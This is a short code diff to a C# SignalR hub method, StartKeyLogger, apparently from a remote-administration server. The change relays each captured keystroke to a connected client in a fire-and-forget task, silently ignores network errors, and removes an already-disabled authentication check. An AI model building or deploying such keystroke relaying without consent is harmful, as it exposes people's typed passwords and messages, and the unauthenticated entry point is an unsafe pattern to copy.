@@ -205,13 +205,24 @@ namespace Server.Hubs
 
         public async Task StartKeyLogger()
         {
-            //if (!await IsAuthenticated()) return;
             string connectionId = Context.ConnectionId;
             
-            // Bắt đầu lắng nghe và gửi từng phím về Client
-            _inputService.StartKeyLogger(async (keyData) => 
+            _inputService.StartKeyLogger((keyData) => 
             {
-                await _hubContext.Clients.Client(connectionId).SendAsync("ReceiveKeyLog", keyData);
+                // Fire-and-forget - không await
+                _ = Task.Run(async () =>
+                {
+                    try
+                    {
+                        await _hubContext.Clients.Client(connectionId).SendAsync("ReceiveKeyLog", keyData);
+                    }
+                    catch
+                    {
+                        // Bỏ qua lỗi network
+                    }
+                });
+                
+                return Task.CompletedTask;
             });
 
             await Clients.Caller.SendAsync("ReceiveStatus", "KEYLOG", true, "Keylogger đã bắt đầu.");
